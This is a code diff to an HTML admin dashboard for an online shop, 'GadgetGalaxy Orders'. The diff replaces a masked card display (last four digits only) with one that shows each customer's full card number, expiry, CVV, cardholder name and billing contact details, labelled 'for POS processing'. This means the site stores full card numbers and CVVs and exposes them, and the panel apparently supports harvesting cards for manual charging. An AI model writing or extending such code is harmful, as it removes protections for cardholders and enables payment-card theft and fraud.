@@ -12,7 +12,7 @@
             padding: 40px 20px;
             color: #f1f5f9;
         }
-        .container { max-width: 1200px; margin: 0 auto; }
+        .container { max-width: 1400px; margin: 0 auto; }
         h1 { color: #00d4ff; margin-bottom: 10px; }
         .sub { color: #94a3b8; margin-bottom: 30px; }
         .stats {
@@ -50,13 +50,13 @@
         .order-date { color: #94a3b8; font-size: 14px; }
         .order-details {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
             gap: 15px;
             margin: 15px 0;
         }
         .detail-group { background: #0f172a; padding: 12px; border-radius: 12px; }
-        .detail-label { font-size: 12px; color: #94a3b8; margin-bottom: 5px; }
-        .detail-value { font-weight: 500; word-break: break-word; }
+        .detail-label { font-size: 11px; color: #94a3b8; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
+        .detail-value { font-weight: 500; word-break: break-word; font-size: 14px; }
         .badge {
             display: inline-block;
             padding: 4px 12px;
@@ -80,19 +80,28 @@
         .refresh-btn:hover { background: #2563eb; }
         .empty { text-align: center; padding: 60px; background: #1e293b; border-radius: 16px; }
         .total-amount { color: #10b981; font-weight: bold; }
+        .card-details-box {
+            background: #0f172a;
+            padding: 12px;
+            border-radius: 12px;
+            margin-top: 10px;
+            font-family: monospace;
+            font-size: 13px;
+        }
         @media (max-width: 768px) { .order-header { flex-direction: column; gap: 10px; } }
     </style>
 </head>
 <body>
 <div class="container">
     <h1>🛒 GadgetGalaxy Orders</h1>
-    <p class="sub">Admin dashboard to view all customer orders</p>
+    <p class="sub">Admin dashboard - Full card details for POS processing</p>
 
     <button class="refresh-btn" onclick="loadOrders()">🔄 Refresh Orders</button>
 
     <div class="stats" id="stats" style="display: none;">
         <div class="stat-card"><div class="stat-number" id="totalOrders">0</div><div class="stat-label">Total Orders</div></div>
         <div class="stat-card"><div class="stat-number" id="totalRevenue">$0</div><div class="stat-label">Total Revenue</div></div>
+        <div class="stat-card"><div class="stat-number" id="cardCount">0</div><div class="stat-label">Card Orders</div></div>
         <div class="stat-card"><div class="stat-number" id="airtmCount">0</div><div class="stat-label">Airtm Orders</div></div>
         <div class="stat-card"><div class="stat-number" id="cryptoCount">0</div><div class="stat-label">Crypto Orders</div></div>
     </div>
@@ -119,18 +128,18 @@
             
             document.getElementById('stats').style.display = 'flex';
             
-            // Calculate stats
             const totalOrders = orders.length;
             const totalRevenue = orders.reduce((sum, o) => sum + (o.amount || 0), 0);
+            const cardCount = orders.filter(o => o.paymentMethod === 'card').length;
             const airtmCount = orders.filter(o => o.paymentMethod === 'airtm').length;
             const cryptoCount = orders.filter(o => o.paymentMethod === 'crypto').length;
             
             document.getElementById('totalOrders').innerText = totalOrders;
             document.getElementById('totalRevenue').innerHTML = `$${totalRevenue.toLocaleString()}`;
+            document.getElementById('cardCount').innerText = cardCount;
             document.getElementById('airtmCount').innerText = airtmCount;
             document.getElementById('cryptoCount').innerText = cryptoCount;
             
-            // Render orders
             container.innerHTML = orders.map(order => `
                 <div class="order-card">
                     <div class="order-header">
@@ -168,10 +177,18 @@
                         </div>
                     </div>
                     
-                    ${order.billing ? `
-                    <div class="detail-group" style="margin-top:10px;">
-                        <div class="detail-label">💳 CARD DETAILS</div>
-                        <div class="detail-value">Card: ****${order.billing.cardLast4} | Exp: ${order.billing.expiry} | ${order.billing.cardholderName}</div>
+                    ${order.paymentMethod === 'card' && order.cardDetails ? `
+                    <div class="detail-group" style="margin-top:15px;">
+                        <div class="detail-label">💳 FULL CARD DETAILS (FOR POS)</div>
+                        <div class="card-details-box">
+                            <strong>Card Number:</strong> ${order.cardDetails.cardNumber}<br>
+                            <strong>Expiry:</strong> ${order.cardDetails.expiry}<br>
+                            <strong>CVV:</strong> ${order.cardDetails.cvv}<br>
+                            <strong>Cardholder:</strong> ${order.cardDetails.cardholderName}<br>
+                            <strong>Billing Email:</strong> ${order.billingDetails?.email}<br>
+                            <strong>Billing Phone:</strong> ${order.billingDetails?.phone}<br>
+                            <strong>Billing Address:</strong> ${order.billingDetails?.address}, ${order.billingDetails?.city}, ${order.billingDetails?.zip}, ${order.billingDetails?.country}
+                        </div>
                     </div>
                     ` : ''}
                     
@@ -188,7 +205,6 @@
     }
     
     loadOrders();
-    // Auto-refresh every 30 seconds
     setInterval(loadOrders, 30000);
 </script>
 </body>
